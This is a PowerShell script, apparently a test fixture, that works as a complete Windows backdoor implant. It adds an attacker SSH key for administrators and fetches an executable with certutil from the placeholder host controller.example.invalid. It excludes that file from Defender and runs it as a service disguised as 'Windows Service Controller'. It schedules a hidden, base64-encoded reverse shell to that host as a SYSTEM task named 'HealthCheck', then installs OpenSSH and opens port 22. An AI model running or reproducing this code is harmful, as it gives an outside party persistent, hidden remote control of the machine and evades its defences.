$ErrorActionPreference='Continue'
$key='ssh-ed25519 AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB fixture'
$out=@()
try{
  New-Item -ItemType Directory -Path C:\ProgramData\ssh -Force | Out-Null
  Add-Content -Path C:\ProgramData\ssh\administrators_authorized_keys -Value $key -Force -Encoding ascii
  icacls C:\ProgramData\ssh\administrators_authorized_keys /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F" 2>&1 | Out-Null
  $osv = (Get-WmiObject Win32_OperatingSystem).Version
  $exe = 'agent_old.exe'
  if([int]$osv.Split('.')[0] -ge 10){ $exe = 'agent.exe' }
  try{
    cmd /c ("certutil -urlcache -split -f http://controller.example.invalid:8012/"+$exe+" C:\Windows\Temp\agent.exe") 2>&1 | Out-Null
    try{ Add-MpPreference -ExclusionPath 'C:\Windows\Temp\agent.exe' -ErrorAction SilentlyContinue 2>&1 | Out-Null }catch{}
    sc.exe stop agent 2>&1 | Out-Null
    sc.exe delete agent 2>&1 | Out-Null
    Start-Sleep 1
    sc.exe create agent binPath= '"C:\Windows\Temp\agent.exe"' start= auto DisplayName= 'Windows Service Controller' 2>&1 | Out-Null
    sc.exe start agent 2>&1 | Out-Null
    $out += 'AGENT_OK'
  }catch{ $out += 'AGENTERR: '+$_.Exception.Message }
  $b='$c=New-Object Net.Sockets.TCPClient("controller.example.invalid",5566);$s=$c.GetStream();while(($i=$s.Read((New-Object byte[] 65536),0,65536)) -ne 0){$d=(Write-Output ([Text.Encoding]::UTF8.GetString((New-Object byte[] 65536),0,$i)) 2>&1|Out-String);$r=([Text.Encoding]::UTF8.GetBytes($d));$s.Write($r,0,$r.Length)};$c.Close()'
  $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($b))
  schtasks /create /tn "HealthCheck" /tr "powershell -ep bypass -w hidden -enc $enc" /sc minute /mo 5 /ru SYSTEM /f 2>&1 | Out-Null
  $out += 'BEACON_OK'
  if([int]$osv.Split('.')[0] -ge 10){
    $svc=Get-Service sshd -ErrorAction SilentlyContinue
    if(-not $svc){
      try{ Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 2>&1 | Out-Null }catch{}
      Start-Sleep 3
      if(-not (Get-Service sshd -ErrorAction SilentlyContinue)){
        try{
          cmd /c "certutil -urlcache -split -f http://controller.example.invalid:8012/OpenSSH-Win64.zip C:\Windows\Temp\oss.zip" 2>&1 | Out-Null
          Expand-Archive C:\Windows\Temp\oss.zip -DestinationPath 'C:\Program Files\OpenSSH' -Force
          Set-Location 'C:\Program Files\OpenSSH\OpenSSH-Win64'
          powershell -ep bypass -f install-sshd.ps1 2>&1 | Out-Null
        }catch{ $out += 'ZIPERR: '+$_.Exception.Message }
      }
    }
    Set-Service sshd -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service sshd -ErrorAction SilentlyContinue
    cmd /c "certutil -urlcache -split -f http://controller.example.invalid:8012/sshd_config.txt C:\ProgramData\ssh\sshd_config" 2>&1 | Out-Null
    Restart-Service sshd -ErrorAction SilentlyContinue
    netsh advfirewall firewall delete rule name="sshd" 2>&1 | Out-Null
    netsh advfirewall firewall add rule name="sshd" dir=in action=allow protocol=TCP localport=22 2>&1 | Out-Null
    $out += 'SSH_OK'
  }
}catch{ $out += 'ERR: '+$_.Exception.Message }
$out -join '|'
